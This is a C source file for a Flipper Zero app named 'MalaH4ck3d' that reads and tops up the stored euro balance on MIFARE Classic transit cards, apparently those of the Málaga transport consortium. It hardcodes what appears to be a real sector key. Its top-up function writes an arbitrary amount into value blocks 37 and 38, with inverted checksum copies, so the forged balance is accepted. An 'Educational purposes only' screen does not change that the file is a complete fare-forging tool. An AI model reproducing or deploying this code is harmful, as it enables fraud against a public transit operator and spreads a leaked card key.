#include <furi.h>
#include <gui/gui.h>
#include <input/input.h>
#include <nfc/nfc.h>
#include <nfc/protocols/mf_classic/mf_classic.h>
#include <nfc/protocols/mf_classic/mf_classic_poller_sync.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef enum {
    ScreenSplash,
    ScreenMenu,
    ScreenBalance,
    ScreenKeyEntry,
    ScreenTopUpAmount,
    ScreenTopUpResult,
    ScreenDisclaimer,
    ScreenCredits,
} AppScreen;

typedef struct {
    char saldo_texto[32];
    bool tarjeta_leida;
    FuriMutex* mutex;
    AppScreen screen;
    uint8_t menu_index;
    uint32_t splash_started;
    char status_text[48];
    char key_hex[13];
    bool key_configured;
    char amount_buf[16];
    uint8_t amount_cursor;
    uint8_t key_cursor;
    bool is_busy;
} AppState;

static char* const menu_labels[] = {
    "Check Balance",
    "Insert your KEY",
    "Top up Balance",
    "! Disclaimer",
    "? Credits",
};

static uint8_t hex_to_nibble(char c) {
    if(c >= '0' && c <= '9') return (uint8_t)(c - '0');
    if(c >= 'A' && c <= 'F') return (uint8_t)(c - 'A' + 10);
    if(c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
    return 0xFF;
}

static bool parse_hex_key(const char* input, MfClassicKey* key) {
    size_t len = strlen(input);
    if(len != 12) return false;

    for(uint8_t i = 0; i < 6; i++) {
        uint8_t hi = hex_to_nibble(input[i * 2]);
        uint8_t lo = hex_to_nibble(input[i * 2 + 1]);
        if(hi == 0xFF || lo == 0xFF) return false;
        key->data[i] = (uint8_t)((hi << 4) | lo);
    }

    return true;
}

static void format_balance_from_block(const MfClassicBlock* block, char* out, size_t out_size) {
    int32_t saldo_raw = (int32_t)((block->data[1] << 8) | block->data[0]);
    float saldo_euros = ((float)saldo_raw / 100.0f) / 2.0f;
    snprintf(out, out_size, "%.2f", (double)saldo_euros);
}

static bool read_balance_from_card(Nfc* nfc, MfClassicKey* key, char* saldo_texto, size_t size) {
    MfClassicBlock block;
    MfClassicError error = mf_classic_poller_sync_read_block(
        nfc,
        37,
        key,
        MfClassicKeyTypeA,
        &block);

    if(error != MfClassicErrorNone) return false;

    format_balance_from_block(&block, saldo_texto, size);
    return true;
}

static bool write_value_blocks(Nfc* nfc, MfClassicKey* key, uint32_t cents) {
    uint16_t raw_value = (uint16_t)(cents * 2);
    MfClassicBlock original_block_37;
    MfClassicBlock original_block_38;
    MfClassicBlock new_block_37;
    MfClassicBlock new_block_38;

    MfClassicError error37 = mf_classic_poller_sync_read_block(
        nfc,
        37,
        key,
        MfClassicKeyTypeA,
        &original_block_37);

    MfClassicError error38 = mf_classic_poller_sync_read_block(
        nfc,
        38,
        key,
        MfClassicKeyTypeA,
        &original_block_38);

    if(error37 != MfClassicErrorNone || error38 != MfClassicErrorNone) return false;

    memcpy(&new_block_37, &original_block_37, sizeof(MfClassicBlock));
    memcpy(&new_block_38, &original_block_38, sizeof(MfClassicBlock));

    new_block_37.data[0] = raw_value & 0xFF;
    new_block_37.data[1] = (raw_value >> 8) & 0xFF;
    new_block_37.data[4] = (uint8_t)(~new_block_37.data[0] & 0xFF);
    new_block_37.data[5] = (uint8_t)(~new_block_37.data[1] & 0xFF);
    new_block_37.data[8] = new_block_37.data[0];
    new_block_37.data[9] = new_block_37.data[1];

    new_block_38.data[0] = raw_value & 0xFF;
    new_block_38.data[1] = (raw_value >> 8) & 0xFF;
    new_block_38.data[4] = (uint8_t)(~new_block_38.data[0] & 0xFF);
    new_block_38.data[5] = (uint8_t)(~new_block_38.data[1] & 0xFF);
    new_block_38.data[8] = new_block_38.data[0];
    new_block_38.data[9] = new_block_38.data[1];

    MfClassicError write_error_37 = mf_classic_poller_sync_write_block(
        nfc,
        37,
        key,
        MfClassicKeyTypeA,
        &new_block_37);

    MfClassicError write_error_38 = mf_classic_poller_sync_write_block(
        nfc,
        38,
        key,
        MfClassicKeyTypeA,
        &new_block_38);

    return (write_error_37 == MfClassicErrorNone && write_error_38 == MfClassicErrorNone);
}

static void draw_splash(Canvas* canvas, AppState* state) {
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 10, 15, "MalaH4ck3d");
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 10, 34, "Booting NFC tools...");

    uint32_t elapsed = furi_get_tick() - state->splash_started;
    uint8_t frame = (elapsed / 250) % 4;
    const char* spinner = "|/-\\";
    canvas_draw_str(canvas, 10, 52, "Loading");
    canvas_draw_str(canvas, 58, 52, &spinner[frame]);
}

static void draw_menu(Canvas* canvas, AppState* state) {
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 15, "Main Menu");
    canvas_set_font(canvas, FontSecondary);

    int8_t start = 0;
    if(state->menu_index > 2) {
        start = state->menu_index - 2;
    }

    /* Use larger vertical spacing and taller frames so text fits inside boxes */
    for(uint8_t i = 0; i < 5; i++) {
        int8_t idx = start + i;
        if(idx >= 5) break;

        uint8_t y = 32 + (i * 14);
        /* Draw a thin rounded outline rectangle around each menu item */
        /* x, y, width, height, radius */
        canvas_draw_rframe(canvas, 6, y - 10, 120, 14, 3);

        if(idx == state->menu_index) {
            canvas_draw_str(canvas, 10, y, ">");
        }

        /* For the first three items show number + label; last two show full label */
        if(idx < 3) {
            char buf[64];
            snprintf(buf, sizeof(buf), "%d. %s", idx + 1, menu_labels[idx]);
            canvas_draw_str(canvas, 26, y, buf);
        } else {
            canvas_draw_str(canvas, 26, y, menu_labels[idx]);
        }
    }

    /* Move help text toward bottom to avoid overlap */
    canvas_draw_str(canvas, 5, 110, "OK select | BACK exit");
}

static void draw_balance(Canvas* canvas, AppState* state) {
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 15, "Check Balance");
    canvas_set_font(canvas, FontSecondary);

    if(state->tarjeta_leida) {
        canvas_draw_str(canvas, 5, 35, "Card detected");
        canvas_set_font(canvas, FontBigNumbers);
        canvas_draw_str(canvas, 5, 54, state->saldo_texto);
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 5 + canvas_string_width(canvas, state->saldo_texto) + 4, 54, "€");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 5, 80, "BACK to return");
    } else {
        canvas_draw_str(canvas, 5, 35, "Approach the card");
        canvas_draw_str(canvas, 5, 52, "Reading value block...");
    }
}

static void draw_key_entry(Canvas* canvas, AppState* state) {
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 15, "Insert your KEY");
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 5, 35, "HEX 6 bytes");
    canvas_draw_str(canvas, 5, 50, state->key_hex);
    canvas_draw_str(canvas, 5 + (state->key_cursor * 6), 62, "^");
    canvas_draw_str(canvas, 5, 76, "UP/DOWN change | OK save");
}

static void draw_amount_entry(Canvas* canvas, AppState* state) {
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 15, "Top up Balance");
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 5, 35, "Amount in EUR");
    canvas_draw_str(canvas, 5, 50, state->amount_buf);
    canvas_draw_str(canvas, 5 + (state->amount_cursor * 6), 62, "^");
    canvas_draw_str(canvas, 5, 76, "UP/DOWN change | OK confirm");
}

static void draw_status(Canvas* canvas, AppState* state) {
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 15, "Status");
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 5, 36, state->status_text);
    canvas_draw_str(canvas, 5, 76, "BACK to menu");
}

static void draw_disclaimer(Canvas* canvas, AppState* state) {
    UNUSED(state);
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 15, "Disclaimer");
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 5, 35, "Educational purposes only.");
    canvas_draw_str(canvas, 5, 48, "This project is for learning");
    canvas_draw_str(canvas, 5, 61, "how these systems work.");
    canvas_draw_str(canvas, 5, 76, "BACK to menu");
}

static void draw_credits(Canvas* canvas, AppState* state) {
    UNUSED(state);
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 15, "Credits");
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 5, 36, "Built by @bg3z");
    canvas_draw_str(canvas, 5, 49, "on GitHub");
    canvas_draw_str(canvas, 5, 76, "BACK to menu");
}

static void draw_callback(Canvas* canvas, void* ctx) {
    AppState* state = ctx;
    if(!state) return;

    furi_mutex_acquire(state->mutex, FuriWaitForever);

    switch(state->screen) {
    case ScreenSplash:
        draw_splash(canvas, state);
        break;
    case ScreenMenu:
        draw_menu(canvas, state);
        break;
    case ScreenBalance:
        draw_balance(canvas, state);
        break;
    case ScreenKeyEntry:
        draw_key_entry(canvas, state);
        break;
    case ScreenTopUpAmount:
        draw_amount_entry(canvas, state);
        break;
    case ScreenTopUpResult:
        draw_status(canvas, state);
        break;
    case ScreenDisclaimer:
        draw_disclaimer(canvas, state);
        break;
    case ScreenCredits:
        draw_credits(canvas, state);
        break;
    default:
        draw_menu(canvas, state);
        break;
    }

    furi_mutex_release(state->mutex);
}

static void input_callback(InputEvent* input_event, void* ctx) {
    FuriMessageQueue* event_queue = ctx;
    furi_message_queue_put(event_queue, input_event, FuriWaitForever);
}

int32_t consorcio_malaga_app(void* p) {
    UNUSED(p);

    FuriMessageQueue* event_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    AppState* state = malloc(sizeof(AppState));
    memset(state, 0, sizeof(AppState));
    state->tarjeta_leida = false;
    strcpy(state->saldo_texto, "0.00");
    strcpy(state->status_text, "Ready");
    strcpy(state->key_hex, "000000000000");
    strcpy(state->amount_buf, "0");
    state->amount_cursor = 0;
    state->key_cursor = 0;
    state->screen = ScreenSplash;
    state->menu_index = 0;
    state->splash_started = furi_get_tick();
    state->mutex = furi_mutex_alloc(FuriMutexTypeNormal);

    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, draw_callback, state);
    view_port_input_callback_set(view_port, input_callback, event_queue);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    Nfc* nfc = nfc_alloc();

    InputEvent event;
    bool running = true;

    while(running) {
        if(furi_message_queue_get(event_queue, &event, 100) == FuriStatusOk) {
            if(event.type != InputTypeShort) continue;

            if(state->screen == ScreenSplash) {
                if(event.key == InputKeyBack) {
                    running = false;
                }
                continue;
            }

            if(state->screen == ScreenMenu) {
                switch(event.key) {
                case InputKeyUp:
                    state->menu_index = (state->menu_index + 4) % 5;
                    break;
                case InputKeyDown:
                    state->menu_index = (state->menu_index + 1) % 5;
                    break;
                case InputKeyOk:
                    switch(state->menu_index) {
                    case 0:
                        state->screen = ScreenBalance;
                        state->tarjeta_leida = false;
                        strcpy(state->status_text, "Reading card...");
                        break;
                    case 1:
                        state->screen = ScreenKeyEntry;
                        state->key_cursor = 0;
                        break;
                    case 2:
                        state->screen = ScreenTopUpAmount;
                        state->amount_cursor = 0;
                        strcpy(state->amount_buf, "0");
                        break;
                    case 3:
                        state->screen = ScreenDisclaimer;
                        break;
                    case 4:
                        state->screen = ScreenCredits;
                        break;
                    }
                    break;
                case InputKeyBack:
                    running = false;
                    break;
                default:
                    break;
                }
            } else if(state->screen == ScreenBalance) {
                if(event.key == InputKeyBack) {
                    state->screen = ScreenMenu;
                }
            } else if(state->screen == ScreenKeyEntry) {
                if(event.key == InputKeyBack) {
                    state->screen = ScreenMenu;
                } else if(event.key == InputKeyLeft) {
                    if(state->key_cursor > 0) state->key_cursor--;
                } else if(event.key == InputKeyRight) {
                    if(state->key_cursor < 11) state->key_cursor++;
                } else if(event.key == InputKeyUp) {
                    char hex_chars[] = "0123456789ABCDEF";
                    uint8_t current = hex_to_nibble(state->key_hex[state->key_cursor]);
                    if(current == 0xFF) current = 0;
                    current = (current + 1) % 16;
                    state->key_hex[state->key_cursor] = hex_chars[current];
                } else if(event.key == InputKeyDown) {
                    char hex_chars[] = "0123456789ABCDEF";
                    uint8_t current = hex_to_nibble(state->key_hex[state->key_cursor]);
                    if(current == 0xFF) current = 0;
                    current = (current + 15) % 16;
                    state->key_hex[state->key_cursor] = hex_chars[current];
                } else if(event.key == InputKeyOk) {
                    MfClassicKey key;
                    if(parse_hex_key(state->key_hex, &key)) {
                        state->key_configured = true;
                        snprintf(state->status_text, sizeof(state->status_text), "Key stored");
                    } else {
                        snprintf(state->status_text, sizeof(state->status_text), "Invalid KEY");
                    }
                    state->screen = ScreenMenu;
                }
            } else if(state->screen == ScreenTopUpAmount) {
                if(event.key == InputKeyBack) {
                    state->screen = ScreenMenu;
                } else if(event.key == InputKeyLeft) {
                    if(state->amount_cursor > 0) state->amount_cursor--;
                } else if(event.key == InputKeyRight) {
                    if(state->amount_cursor < strlen(state->amount_buf) - 1) state->amount_cursor++;
                } else if(event.key == InputKeyUp) {
                    if(state->amount_cursor >= strlen(state->amount_buf)) {
                        state->amount_buf[strlen(state->amount_buf)] = '0';
                        state->amount_buf[strlen(state->amount_buf) + 1] = '\0';
                    }
                    char* ch = &state->amount_buf[state->amount_cursor];
                    if(*ch == '\0') *ch = '0';
                    if(*ch >= '0' && *ch <= '9') {
                        if(*ch == '9') *ch = '0';
                        else (*ch)++;
                    }
                } else if(event.key == InputKeyDown) {
                    if(state->amount_cursor >= strlen(state->amount_buf)) {
                        state->amount_buf[strlen(state->amount_buf)] = '0';
                        state->amount_buf[strlen(state->amount_buf) + 1] = '\0';
                    }
                    char* ch = &state->amount_buf[state->amount_cursor];
                    if(*ch == '\0') *ch = '0';
                    if(*ch >= '0' && *ch <= '9') {
                        if(*ch == '0') *ch = '9';
                        else (*ch)--;
                    }
                } else if(event.key == InputKeyOk) {
                    uint32_t cents = 0;
                    size_t len = strlen(state->amount_buf);
                    for(size_t i = 0; i < len; i++) {
                        if(state->amount_buf[i] >= '0' && state->amount_buf[i] <= '9') {
                            cents = cents * 10 + (uint32_t)(state->amount_buf[i] - '0');
                        }
                    }
                    cents *= 100;

                    MfClassicKey key;
                    if(state->key_configured) {
                        if(parse_hex_key(state->key_hex, &key)) {
                            if(write_value_blocks(nfc, &key, cents)) {
                                snprintf(state->status_text, sizeof(state->status_text), "Top up done");
                            } else {
                                snprintf(state->status_text, sizeof(state->status_text), "Write failed");
                            }
                        } else {
                            snprintf(state->status_text, sizeof(state->status_text), "Invalid KEY");
                        }
                    } else {
                        snprintf(state->status_text, sizeof(state->status_text), "Enter KEY first");
                    }
                    state->screen = ScreenTopUpResult;
                }
            } else if(state->screen == ScreenTopUpResult || state->screen == ScreenDisclaimer || state->screen == ScreenCredits) {
                if(event.key == InputKeyBack) {
                    state->screen = ScreenMenu;
                }
            }
        }

        if(state->screen == ScreenSplash && (furi_get_tick() - state->splash_started) > 3000) {
            state->screen = ScreenMenu;
        }

        if(state->screen == ScreenBalance) {
            MfClassicKey key;
            if(state->key_configured) {
                if(parse_hex_key(state->key_hex, &key)) {
                    if(read_balance_from_card(nfc, &key, state->saldo_texto, sizeof(state->saldo_texto))) {
                        state->tarjeta_leida = true;
                    } else {
                        state->tarjeta_leida = false;
                        snprintf(state->status_text, sizeof(state->status_text), "Read failed");
                    }
                }
            } else {
                MfClassicKey default_key = {{0x99, 0x10, 0x02, 0x25, 0xD8, 0x3B}};
                if(read_balance_from_card(nfc, &default_key, state->saldo_texto, sizeof(state->saldo_texto))) {
                    state->tarjeta_leida = true;
                } else {
                    state->tarjeta_leida = false;
                    snprintf(state->status_text, sizeof(state->status_text), "Read failed");
                }
            }
            view_port_update(view_port);
            furi_delay_ms(1000);
            state->screen = ScreenBalance;
        }

        view_port_update(view_port);
    }

    nfc_free(nfc);
    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_message_queue_free(event_queue);
    furi_mutex_free(state->mutex);
    free(state);
    furi_record_close(RECORD_GUI);

    return 0;
}